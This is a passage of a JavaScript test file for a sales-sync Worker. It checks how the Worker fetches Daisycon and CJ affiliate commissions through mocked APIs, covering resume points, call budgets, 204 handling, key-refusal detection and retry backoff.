});

test('review P1-9: after a long stop Daisycon reads from the last good run, within one run\'s call budget, and goes on next run', async () => {
  const db = fakeD1();
  db.sql.exec("INSERT INTO network_sync_runs (ran_at, network, ok, state, calls, fetched, saved) VALUES ('2026-10-02T12:00:00Z', 'daisycon', 1, 'ok', 3, 0, 0)");
  const late = new Date('2027-03-01T12:00:00Z');
  const dc = fakeDaisycon({ transactions: Array.from({ length: PER_PAGE * 15 }, (_, i) => dcTx(`B${i}`, [{}])) });
  const net = fakeNet(dc.routes);
  const run1 = await syncOne(daisycon, DC, { fetchFn: net.fetchFn, now: late, db });
  assert.equal(run1.ok, true, run1.message);
  assert.equal(run1.calls, MAX_CALLS, 'the whole budget, never more');
  const firstAsk = net.calls.find(c => c.url.pathname.endsWith('/transactions'));
  assert.equal(firstAsk.url.searchParams.get('date_modified_start'), '2026-10-01', 'from the last good run (a day before), not only 35 days');
  assert.match(run1.message, /goes on from 2026-11-30/);
  assert.equal(await getMeta(db, RESUME_KEY), '2026-11-30T12:00:00.000Z');
  // next run: few sales; it starts at the resume point (older than its 35 days) and clears it when done
  dc.transactions.length = 0;
  dc.transactions.push(dcTx('C1', [{}]));
  const net2 = fakeNet(dc.routes);
  const run2 = await syncOne(daisycon, DC, { fetchFn: net2.fetchFn, now: new Date(late.getTime() + 2 * 3600e3), db });
  assert.equal(run2.ok, true, run2.message);
  assert.equal(net2.calls.find(c => c.url.pathname.endsWith('/transactions')).url.searchParams.get('date_modified_start'), '2026-11-30');
  assert.equal(await getMeta(db, RESUME_KEY), '', 'the resume point is cleared');
});

test('review P1-1: the Worker writes the code version it runs, for the setup tool\'s live-version guard', async () => {
  const db = fakeD1();
  await syncNetworks({ SALES_DB: db, GW_COMMIT: 'ab'.repeat(20) }, { fetchFn: fakeNet({}).fetchFn, now: NOW });
  assert.equal(await getMeta(db, 'commit'), 'ab'.repeat(20));
  await syncNetworks({ SALES_DB: db, GW_COMMIT: 'not-a-commit' }, { fetchFn: fakeNet({}).fetchFn, now: NOW });
  assert.equal(await getMeta(db, 'commit'), 'ab'.repeat(20), 'only a full commit is written');
});

test('review P1-7: the CJ key test tells a refused key from a question with an error', async () => {
  const refused = await cjTest({ token: CJ_TOKEN, cids: ['7806395'], fetchImpl: fakeNet({ 'commissions.api.cj.com': () => json({ message: 'Unauthorized' }, 403) }).fetchFn, now: NOW });
  assert.deepEqual([refused.ok, refused.refused, refused.queryError], [false, true, '']);
  const query = await cjTest({ token: CJ_TOKEN, cids: ['7806395'], fetchImpl: fakeNet({ 'commissions.api.cj.com': () => json({ errors: [{ message: "Cannot query field 'x' on type 'PublisherCommission'" }] }) }).fetchFn, now: NOW });
  assert.deepEqual([query.ok, query.refused], [false, false]);
  assert.match(query.queryError, /Cannot query field/);
});

test('re-review: every CID "Not authorized" = CJ refused this key for these accounts, not a code error', async () => {
  const notAuth = fakeNet({ 'commissions.api.cj.com': () => json({ errors: [{ message: 'Not authorized for publisher 7806395' }] }) });
  const a = await cjTest({ token: CJ_TOKEN, cids: ['8114224', '7806395'], fetchImpl: notAuth.fetchFn, now: NOW });
  assert.deepEqual([a.ok, a.refused, a.accountsRefused, a.queryError], [false, false, true, '']);
  const mixed = fakeNet({ 'commissions.api.cj.com': (u, body) => json({ errors: [{ message: body.includes('8114224') ? 'Not authorized' : "Cannot query field 'x'" }] }) });
  const m = await cjTest({ token: CJ_TOKEN, cids: ['8114224', '7806395'], fetchImpl: mixed.fetchFn, now: NOW });
  assert.equal(m.accountsRefused, false, 'one real query error is still a code error');
  assert.match(m.queryError, /Cannot query field/);
  const one = fakeNet({ 'commissions.api.cj.com': (u, body) => (body.includes('8114224') ? json({ errors: [{ message: 'Not authorized' }] }) : fakeCj({ byCid: { 7806395: [] } })(u, body)) });
  const o = await cjTest({ token: CJ_TOKEN, cids: ['8114224', '7806395'], fetchImpl: one.fetchFn, now: NOW });
  assert.deepEqual([o.ok, o.accountsRefused], [true, false], 'one account that works is enough');
});

// First live run (19 Nov 2026): Daisycon answered 204 No Content for a transactions list with nothing in it.
// One fake Daisycon per test (its sign-in keys work once); the transactions answer can be swapped between runs.
function dcWith(transactionsRoute, publishersRoute = () => json([{ id: 123456 }]), dc = fakeDaisycon()) {
  return { ...dc.routes, 'services.daisycon.com/publishers/': (...a) => transactionsRoute(...a), 'services.daisycon.com/publishers': publishersRoute };
}

test('live fix: Daisycon 204 on the first page = no sales, the run is ok', async () => {
  const db = fakeD1();
  const dc = fakeDaisycon();
  let answer = () => new Response(null, { status: 204 });
  const net = fakeNet(dcWith((...a) => answer(...a), undefined, dc));
  const run = await syncOne(daisycon, DC, { fetchFn: net.fetchFn, now: NOW, db });
  assert.equal(run.ok, true, run.message);
  assert.equal(run.saved, 0);
  assert.equal(run.state, 'ok');
  const asked = net.calls.filter(c => c.url.pathname.endsWith('/transactions'));
  assert.ok(asked.length > 0 && asked.every(c => c.url.searchParams.get('page') === '1'), 'one page per window, then it stops');
  answer = () => new Response('', { status: 200 });
  const empty200 = await syncOne(daisycon, DC, { fetchFn: net.fetchFn, now: new Date(NOW.getTime() + 7200e3), db });
  assert.equal(empty200.ok, true, `an empty 200 too: ${empty200.message}`);
});

test('live fix: Daisycon 200 then 204 stops paging and keeps the first page', async () => {
  const db = fakeD1();
  const full = Array.from({ length: PER_PAGE }, (_, i) => dcTx(`F${i}`, [{}]));
  const net = fakeNet(dcWith(u => (u.searchParams.get('page') === '1' ? json(full) : new Response(null, { status: 204 }))));
  const run = await syncOne(daisycon, DC, { fetchFn: net.fetchFn, now: NOW, db });
  assert.equal(run.ok, true, run.message);
  assert.equal(run.saved, PER_PAGE);
  const pages = net.calls.filter(c => c.url.pathname.endsWith('/transactions')).map(c => c.url.searchParams.get('page'));
  assert.ok(pages.every(p => p === '1' || p === '2') && pages.includes('2'), 'page 2 answered 204, no page 3');
});

test('live fix: other Daisycon answers stay errors; a 204 publisher list says there is no account', async () => {
  const db = fakeD1();
  const broken = await syncOne(daisycon, DC, { fetchFn: fakeNet(dcWith(() => json({ error: 'x' }, 500))).fetchFn, now: NOW, db });
  assert.equal(broken.ok, false);
  assert.match(broken.message, /Daisycon answered 500 on \/publishers\/<id>\/transactions/);
  const noPub = await syncOne(daisycon, DC, { fetchFn: fakeNet(dcWith(() => json([]), () => new Response(null, { status: 204 }))).fetchFn, now: NOW, db: fakeD1() });
  assert.equal(noPub.ok, false);
  assert.match(noPub.message, /Daisycon gave no publisher account/);
});

test('live fix: CJ 204 = no commissions in that range; CJ\'s "No authorized publisher ids" = this key is refused for that account', async () => {
  const db = fakeD1();
  const run = await syncOne(cj, { CJ_TOKEN, CJ_PUBLISHER_IDS: '8114224' }, { fetchFn: fakeNet({ 'commissions.api.cj.com/query': () => new Response(null, { status: 204 }) }).fetchFn, now: NOW, db });
  assert.equal(run.ok, true, run.message);
  assert.equal(run.saved, 0);
  const words = 'No authorized publisher ids were specified in the query';
  const t = await cjTest({ token: CJ_TOKEN, cids: ['7806395'], fetchImpl: fakeNet({ 'commissions.api.cj.com': () => json({ errors: [{ message: words }] }) }).fetchFn, now: NOW });
  assert.deepEqual([t.ok, t.accountsRefused, t.queryError], [false, true, '']);
});

test('re-review: the new single-use Daisycon key survives a D1 that is busy twice (3 attempts with backoff)', async () => {
  const db = fakeD1();
  const realPrepare = db.prepare;
  let failures = 2;
  db.prepare = text => (/INSERT INTO network_oauth/.test(text) && failures > 0
    ? { bind: () => ({ run: async () => { failures--; throw new Error('D1_ERROR: overloaded'); } }) }
    : realPrepare(text));
  const waits = [];
  const run = await syncOne(daisycon, DC, { fetchFn: fakeNet(fakeDaisycon().routes).fetchFn, now: NOW, db, sleepFn: async ms => { waits.push(ms); } });
  assert.equal(run.ok, true, run.message);
  assert.deepEqual(waits, [2000, 4000]);
  assert.equal(await openText(KEY, db.sql.prepare("SELECT iv, ciphertext FROM network_oauth WHERE network = 'daisycon'").get(), 'daisycon'), 'dcRefresh-next-1-abcdef', 'kept on the third attempt');
});
